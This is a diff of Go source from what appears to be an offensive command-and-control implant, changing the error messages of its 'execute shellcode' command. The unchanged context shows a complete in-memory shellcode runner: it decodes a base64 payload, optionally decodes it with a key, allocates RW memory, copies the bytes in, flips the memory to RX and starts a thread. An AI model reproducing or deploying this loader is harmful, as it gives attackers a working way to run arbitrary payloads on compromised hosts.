@@ -29,29 +29,29 @@ var (
 
 func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: shellcode_b64 parameter required")
+		return errorResult("shellcode_b64 parameter required")
 	}
 	args, parseErr := unmarshalParams[executeShellcodeArgs](task)
 	if parseErr != nil {
 		return *parseErr
 	}
 	if args.ShellcodeB64 == "" {
-		return errorResult("Error: shellcode_b64 is empty")
+		return errorResult("shellcode_b64 is empty")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
+		return errorf("decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return errorResult("Error: shellcode is empty after decoding")
+		return errorResult("shellcode is empty after decoding")
 	}
 
 	if args.Encoding != "" && args.Encoding != "none" {
 		shellcode, err = decodeShellcode(shellcode, args.Encoding, args.Key)
 		if err != nil {
-			return errorf("Error decoding shellcode (%s): %v", args.Encoding, err)
+			return errorf("decoding shellcode (%s): %v", args.Encoding, err)
 		}
 	}
 
@@ -66,7 +66,7 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 	// Step 1: Allocate RW memory
 	addr, err := injectAllocMemory(currentProcess, len(shellcode), PAGE_READWRITE)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to allocate memory for shellcode (%d bytes): %v", len(shellcode), err)
 	}
 
 	// Step 2: Copy shellcode (in-process, no API needed — more efficient than WriteProcessMemory)
@@ -75,13 +75,13 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 
 	// Step 3: Change to RX (W^X enforcement)
 	if _, err := injectProtectMemory(currentProcess, addr, len(shellcode), PAGE_EXECUTE_READ); err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to change memory protection to RX at 0x%X: %v", addr, err)
 	}
 
 	// Step 4: Create thread
 	hThread, err := injectCreateRemoteThread(currentProcess, addr)
 	if err != nil {
-		return errorf("Error: %v", err)
+		return errorf("failed to create execution thread at 0x%X: %v", addr, err)
 	}
 	injectCloseHandle(hThread)
 
